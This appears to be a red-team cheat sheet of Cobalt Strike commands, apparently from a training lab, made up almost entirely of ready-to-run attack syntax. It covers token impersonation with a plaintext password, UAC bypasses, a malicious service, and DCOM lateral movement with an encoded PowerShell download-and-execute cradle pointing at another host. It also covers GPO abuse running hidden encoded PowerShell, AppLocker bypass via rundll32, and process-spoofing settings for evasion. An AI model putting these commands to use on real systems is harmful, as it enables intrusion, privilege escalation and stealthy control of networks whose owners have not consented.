- Make token for local administrator on another machine
	- `make_token wkstn-1921\Administrator MVYZKwfr356v3M`
	- Equivalent to runas /netonly
- Spawn beacon as another user
	- `spawnas CYBER\\n.lamb REDACTED http-vpn`
	- Equivalent to runas.exe
- Execute command on remote machine
	- `remote-exec winrm DTOP896 type C:\Users\duggand\Desktop\AppLocker.txt`
- Create new Windows service
	- `runasadmin uac-cmstplua sc.exe create "Cthulhu Fhtagn Service" start= auto binPath= "C:\Temp\cthulhu.exe"`
	- `runasadmin uac-cmstplua sc.exe start "Cthulhu Fhtagn Service"`
- UAC Bypass
	- `elevate uac-token-duplication tcp-localhost`
- Lateral movement using DCOM
	- `execute-assembly C:\Tools\MiscTools\CsDCOM\bin\Debug\CsDCOM.exe -t wkstn-4945 -b powershell.exe -a "-enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA0ADIAOQA6ADgAMAA4ADEALwB0ACcAKQA=" -m mmc20application`
- SharpGPOAbuse
	- `execute-assembly C:\tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Legit Task" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -enc cABv[...snip...]ACIA" --GPOName "Cthulhu GPO"`
- Run DLL payload (great for AppLocker bypass)
	- `C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW`
- Reverse Port Forward
	- `rportfwd 8080 10.10.5.120 80`
- Change the executable which the beacon will spawn to perform various postex procs (default: rundll32.exe)
	- `spawnto x64 %windir%\sysnative\notepad.exe`
	- Can also set in C2 profile
		```
		post-ex {
		    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
		    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
		}
		```
- Change parent process for all beacon post-ex procs that spawn a process
	- `ppid <PID of desired process>`